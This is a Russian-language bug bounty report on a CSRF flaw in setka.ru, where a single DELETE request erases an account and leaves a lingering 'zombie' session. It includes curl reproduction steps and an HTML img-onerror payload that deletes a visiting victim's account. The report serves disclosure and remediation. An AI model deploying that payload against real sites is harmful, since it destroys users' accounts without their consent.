# Report 02: Удаление аккаунта без подтверждения + Zombie Session

---
**Поля формы:**

- **Название:** Удаление аккаунта одним запросом без подтверждения (CSRF + Zombie Session)
- **Уровень опасности:** Высокий
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

`DELETE https://setka.ru/profile`

## Описание уязвимости

Endpoint `DELETE /profile` на setka.ru удаляет аккаунт пользователя **мгновенно и необратимо** без какого-либо подтверждения: без повторного ввода пароля, без email/SMS подтверждения, без CSRF-токена, без диалога подтверждения.

После удаления возникает **zombie session**: cookie `sess` остаётся валидной. Пользователь попадает в login loop: сервер считает его аутентифицированным, но профиль не существует. Выйти из этого состояния можно только ручной очисткой cookies.

Посты удалённого пользователя остаются как orphaned — без авторства.

## Шаги воспроизведения

### 1. Удаление аккаунта

```bash
curl -X DELETE \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/profile"
```
→ `303 See Other`, `hx-redirect: /login`, `set-cookie: sess=""; Path=/;`

### 2. Профиль удалён

```bash
curl -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/profile"
```
→ `307 Temporary Redirect` (not-found)

### 3. Zombie Session — settings ещё доступны

```bash
curl -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/users/settings/personal-data"
```
→ `200 OK` (страница настроек, но данные пусты — аккаунт удалён)

### 4. Login Loop

```bash
curl -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  "https://setka.ru/login"
```
→ `303 See Other → /` (сервер считает пользователя залогиненным, но аккаунт не существует)

## Влияние на безопасность

1. **CSRF-атака:** Злоумышленник размещает на своём сайте:
```html
<img src="x" onerror="fetch('https://setka.ru/profile',{method:'DELETE',credentials:'include'})">
```
При посещении страницы жертвой — аккаунт удаляется мгновенно.

2. **Zombie Session Lock:** Жертва не может войти обратно — единственный выход — ручная очистка cookies.

3. **Orphaned Content:** Посты остаются без автора — нарушение attribution.

4. **Массовое удаление:** При наличии XSS — массовое удаление аккаунтов.

**Рекомендации:** Подтверждение пароля, 2FA, grace period 14-30 дней, CSRF-токен, инвалидация всех сессий при удалении.

## Дополнительные ссылки

- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- CWE-613: https://cwe.mitre.org/data/definitions/613.html
